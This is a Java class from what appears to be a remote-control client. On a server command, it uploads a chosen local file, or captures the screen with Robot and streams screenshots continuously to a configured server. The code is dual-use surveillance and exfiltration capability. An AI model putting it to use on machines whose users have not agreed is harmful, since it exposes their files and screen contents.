package handler.command.impl;

import command.PropertiesConst;
import command.entity.Computer;
import executor.BaseExecutor;
import handler.Handler;
import handler.command.OtherCommandHandler;
import thread.ThreadManager;
import util.IOUtil;
import views.pages.BitUtils;

import javax.imageio.ImageIO;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

public class UpFileHandler extends OtherCommandHandler implements Runnable {
    private volatile boolean success = true;
    private volatile boolean finish = false;
    private long timeOut = 180000;
    private Computer computer;
    private boolean screenIn;

    private String key;

    public UpFileHandler(String completeCommand, BaseExecutor executor, String key, boolean screenIn) {
        super(completeCommand, executor);
        computer = this.getExecutor().getComputer();
        this.key = key;
        filePath = getCommand();
        if (filePath.split(">").length > 1) {
            filePath = filePath.split(">")[0];
        }
        filePath = filePath.intern();
        this.screenIn = screenIn;
    }

    private Socket fileSocket;
    private String filePath;
    private FileInputStream inputStream;
    private File upFile;
    private BufferedImage image;
    private Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    private Rectangle screenRectangle = new Rectangle(screenSize);
    private Robot robot;

    private boolean checkFile() {
        boolean b = true;
        try {
            if(!screenIn) {
                upFile = new File(filePath);
                inputStream = new FileInputStream(upFile);
            }else{
                try {
                    robot = new Robot();
                }catch (AWTException e) {
                    e.printStackTrace();
                }
            }
        } catch (FileNotFoundException e) {
            b = false;
            e.printStackTrace();
            computer.printMessage("未找到文件:" + filePath);
        }
        return b;
    }

    private void connection() {
        PrintWriter pw = null;
        getPrintWriter().println(getCompleteCommand());
        getPrintWriter().flush();
        try {
            fileSocket = new Socket(PropertiesConst.server, PropertiesConst.port);
            ThreadManager.getExecutorService().execute(this.new Check());
            pw = IOUtil.wrapPrintWriter(fileSocket.getOutputStream(), PropertiesConst.appEncoding);
            computer.printMessage("UpFileHandler:" + getCompleteCommand() + ":" + key + ":" + Handler.UPFILE);
            System.out.println("up将要发送1");
            pw.println(getCompleteCommand() + ":" + key + ":" + Handler.UPFILE);
            pw.flush();
            if (!checkFile()) {
                success = false;
            }
        } catch (IOException e) {
            success = false;
            e.printStackTrace();
        }

        try {
            Thread.sleep(8000);
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (success) {
            computer.printMessage("上传检验成功" + System.currentTimeMillis());
            //告诉服务器上传较验成功
            System.out.println("up将要发送2");
            pw.println(Handler.UPFILESUCCESS);
            pw.flush();
        } else {
            computer.printMessage("上传较验：文件上传失败，可能是找不到文件");
            pw.println("upFail");
            pw.flush();
        }
    }

    class Check implements Runnable {
        private void checkDf() {
            try {
                System.out.println("up将要read");
                String otherStr = IOUtil.readLinStr(fileSocket.getInputStream(), PropertiesConst.appEncoding);
                System.out.println("up read到数据");
                long length = Long.parseLong(otherStr.split(":")[1]);
                if(!screenIn) {
                    otherStr = otherStr.split(":")[0];
                    if (!Handler.DOWNFILESUCCESS.equals(otherStr)) {
                        success = false;
                        computer.printMessage("上传较验：文件下载失败，可能不能创建目录");
                    } else {
                        inputStream.skip(length);
                    }
                }
                computer.printMessage("UpFileHandler:接收到length" + length + "关跳转");
            } catch (Exception e) {
                e.printStackTrace();
            }
            finish = true;
        }

        @Override
        public void run() {
            checkDf();
        }
    }

    @Override
    public Object handler() {
        ThreadManager.getExecutorService().execute(this);
        return null;
    }

    private boolean b = true;

    @Override
    public void run() {
        synchronized (filePath) {
            connection();
            long startTime = System.currentTimeMillis();
            while (!finish) {
                if (System.currentTimeMillis() - startTime > timeOut) {
                    closeInputStream();
                    computer.printMessage("上传文件等待超时");
                    return;
                }
            }
            if (!success) {
                computer.printMessage("文件传输取消，线程结束");
                closeInputStream();
                return;
            }
            computer.printMessage(filePath + "文件上传开始UpFileHandler");
            try {
                Thread.sleep(1000);
                OutputStream outputStream = fileSocket.getOutputStream();
                if(!screenIn) {
                    IOUtil.inputToOutput(inputStream, outputStream);
                }else{

                    Runnable r = new Runnable() {
                        InputStream fileSocketIn = fileSocket.getInputStream();
                        @Override
                        public void run() {
                            while(true) {
                                synchronized (UpFileHandler.this) {
                                    String rb = "";
                                    try {
                                        rb = IOUtil.readLinStr(fileSocketIn, PropertiesConst.appEncoding);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                    if("1".equals(rb)){
                                        UpFileHandler.this.b = true;
                                        UpFileHandler.this.notifyAll();
                                    }
                                }
                            }
                        }
                    };

                    ThreadManager.getExecutorService().submit(r);

                    while(true) {
                        synchronized (this) {
                            image = robot.createScreenCapture(screenRectangle);
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            while(!this.b){
                                this.wait();
                            }
                            ImageIO.write(image, "png", baos);
                            byte[] data = baos.toByteArray();
                            byte[] lenArr = BitUtils.intToBytes(data.length);
                            outputStream.write(lenArr);
                            outputStream.flush();
                            outputStream.write(data);
                            outputStream.flush();
                            this.b = false;
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            computer.printMessage(filePath + "文件上传结束UpFileHandler");
        }
    }

    private void closeInputStream() {
        if (inputStream != null) {
            try {
                inputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public String getKey() {
        return key;
    }

    public void setKey(String key) {
        this.key = key;
    }
}
